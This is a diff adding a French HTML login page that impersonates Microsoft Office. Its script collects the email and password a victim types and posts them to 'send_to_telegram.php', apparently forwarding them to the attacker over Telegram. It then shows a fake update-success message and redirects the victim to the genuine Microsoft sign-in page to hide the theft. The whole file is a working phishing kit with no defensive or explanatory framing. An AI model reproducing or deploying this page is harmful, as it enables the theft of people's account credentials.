@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Connexion</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f0f2f5;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      background: rgba(255, 255, 255, 0.9);
+      padding: 40px 35px;
+      border-radius: 14px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.06);
+      width: 100%;
+      max-width: 460px;
+      box-sizing: border-box;
+      text-align: center;
+    }
+
+    .logo {
+      margin-bottom: 25px;
+    }
+
+    .logo img {
+      width: 220px;
+      height: auto;
+    }
+
+    form {
+      text-align: left;
+    }
+
+    input[type="email"], input[type="password"] {
+      width: 95%;
+      padding: 14px;
+      margin-bottom: 18px;
+      border: 2px solid #fa3900;
+      border-radius: 8px;
+      font-size: 16px;
+      background: #f9f9f9;
+    }
+
+    .button-container {
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    button {
+      padding: 12px 36px;
+      background-color: #fa3900;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      display: inline-block;
+    }
+
+    .success-message {
+      display: none;
+      text-align: center;
+    }
+
+    .success-message img {
+      width: 60px;
+      margin-bottom: 15px;
+    }
+
+    .success-message p {
+      font-size: 18px;
+      color: green;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Microsoft_Office_2013-2019_logo_and_wordmark.svg/2560px-Microsoft_Office_2013-2019_logo_and_wordmark.svg.png" alt="Microsoft Office Logo" />
+    </div>
+
+    <form id="login-form">
+      <input type="email" name="email" placeholder="Adresse email" required />
+      <input type="password" name="password" placeholder="Mot de passe" required />
+      <div class="button-container">
+        <button type="submit">Connexion</button>
+      </div>
+    </form>
+
+    <div class="success-message" id="success-message">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Yes_Check_Circle.svg/1200px-Yes_Check_Circle.svg.png" alt="Succès" />
+      <p>Mise à jour effectuée.</p>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('login-form');
+    const successMessage = document.getElementById('success-message');
+
+    form.addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const formData = new FormData(form);
+
+      fetch('send_to_telegram.php', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          form.style.display = 'none';
+          successMessage.style.display = 'block';
+
+          setTimeout(() => {
+            window.location.href = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638876835038551076.NjU1ZDEwOTItZjM4ZC00YzJmLWExYTUtYTQzMDNkYzE5Y2Q2ZTAwOTE0NDYtM2RmZi00MmFkLWFmOTEtZGE1YmI2YTI5MzEy&ui_locales=fr-FR&mkt=fr-FR&client-request-id=c2581e6d-3aa1-4fee-829c-c933fd00e404&state=3Ca6dJa8AcfLVS9jQV8sB39vG8h9w9uKrj65GGn4IL0H4aSn5TS0P6g6J5NG0HmtEoMX31pZUc1eebu_44CXnY-IqY2KW-0gHXhxobRuNn3NftthPOwi5ggJ2_Jc1d2IK989PAK0dPKpGhf1FtLvhSS_mb2-hVSmCblzmq_qn4WrGmrpMRiUDLQ5FsuJHDdw_4gSwJ2vcA48ucqprkcgj71fVZ5M7vkM3hiWlL0R3Ks3yuFPxzzH8gLrH-p8B7hsbzVYRYWfBh2jQhCt3BFQQa3Ax7fawD8Hye8LPj1Vkus&x-client-SKU=ID_NET8_0&x-client-ver=8.5.0.0";
+          }, 3000);
+        } else {
+          alert("Erreur lors de l'envoi: " + (data.error || "Erreur inconnue."));
+        }
+      })
+      .catch(error => {
+        console.error('Erreur:', error);
+        alert("Une erreur s'est produite.");
+      });
+    });
+  </script>
+
+</body>
+</html>
